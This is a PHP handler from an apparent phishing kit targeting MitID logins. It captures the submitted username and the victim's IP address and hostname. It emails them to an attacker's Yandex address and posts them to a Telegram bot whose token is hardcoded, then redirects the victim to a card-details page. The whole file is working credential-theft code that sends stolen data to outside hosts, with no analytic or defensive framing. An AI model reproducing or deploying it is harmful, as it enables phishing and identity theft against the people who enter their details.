<?php

session_start();

$user=$_POST["user"];


$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['user'] = $user;




$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|Log MitID |----------|\n";
$message .= "User  : ".$_SESSION['user']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";
$email = "k4iser.a@yandex.com";
$subject = "~ <Rslt-MitID>- Coded By k4iser.a ~ | $ip";

mail($email, $subject, $message);

$token = "6297146552:AAG3MEjXG3nKpOLttJtRIDm9YluBhpeqhiM";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=5876774871&text=" . urlencode($message)."" );
header("location:load.php?vc?__event=card&service_id=top_card=IL")
?>